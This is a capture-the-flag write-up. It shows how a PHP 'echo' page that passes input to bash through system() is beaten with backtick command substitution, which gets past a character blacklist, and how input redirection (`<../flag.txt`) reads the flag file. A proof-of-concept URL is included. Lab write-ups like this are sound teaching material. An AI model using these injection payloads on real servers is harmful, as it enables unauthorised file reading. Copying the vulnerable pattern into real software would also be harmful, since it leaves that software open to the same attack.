# $Echo challenge
  
This challenge has a simple HTML page with a php form:
```html
<form method="get" name="index.php">
    <input type="text" name="echo" id="echo" size="80">
    <input type="submit" value="Echo">
</form>
```
I've tested with the string `asd`. It printed `asd` into the page.  
Ok, apparently it prints things into the page, let's play with it.  
  
Firstly, I've tested with a looong string and it printed: `Man that's a mouthful to echo, what even?`.  
Then I tested with an empty string. It printed: `Please don't be lame, I can't just say nothing.`.  
  
So, now I know it prints things. What if I inject a command into it?  
With my bash scripting knowledge I tried two things:  
Tried to inject the command `$(ls)`. It printed: `Hey mate, you seem to be using some characters that makes me wanna throw it back in your face >:(
`. Very funny tough.  
  
The other thing which allow to execute code is `` ` `` (backtick). Tried `` `ls` ``. It printed: `index.php`. Nice, it worked!!  
After that I used cat to read the index.php content, which broke the page layout but I could get the content on the source code of the page:  
```php
<?php
    $to_echo = $_REQUEST['echo'];
    $cmd = "bash -c 'echo " . $to_echo . "'";
    if(isset($to_echo)) {
        if($to_echo=="") {
            print "Please don't be lame, I can't just say nothing."; 
        } elseif (preg_match('/[#!@%^&*()$_+=\-\[\]\';,{}|":>?~\\\\]/', $to_echo)) { 
            print "Hey mate, you seem to be using some characters that makes me wanna throw it back in your face >:("; 
        } elseif ($to_echo=="cat") { 
            print "Meowwww... Well you asked for a cat didn't you? That's the best impression you're gonna get :/"; 
        } elseif (strlen($to_echo) > 15) { 
            print "Man that's a mouthful to echo, what even?"; 
        } else { 
            system($cmd); 
        } 
    } else { 
        print "Alright, what would you have me say?"; 
    } 
?>
```
Now I know what is going on. If I input a string which is not empty, do not contain those chars on that regex, is not equal to "cat" and is not greater than 15 chars, the string will be echoed by the command:  
`bash -c 'echo string'`.  
  
So I started to look for the flag by using the old good ls command and I found the flag on the parent directory `` `ls ..` ``:  
`flag.txt html`  
  
Ok, now how can I read this flag.txt file?  
I cannot use `` `cat ../flag.txt` `` because it has more than 15 chars.  
  
Let's check the source code again looking to the keyboard. Which character is not on that regex besides the `` ` `` (backtick)?
The answer is the `<`.  
  
Knowing that the input string will be the argument to the echo command, I can redirect the input which is the keyboard by default by using the `<` to redirect the input from a file. So to read the flag all I need is to run this: `` `<../flag.txt` ``.  
  
Boom, flag printed, challenge done! (I won't show the flag here, go get yourself, punk!).  
  
PoC: `http://CHALLENGEURL/?echo=%60%3C..%2Fflag.txt%60`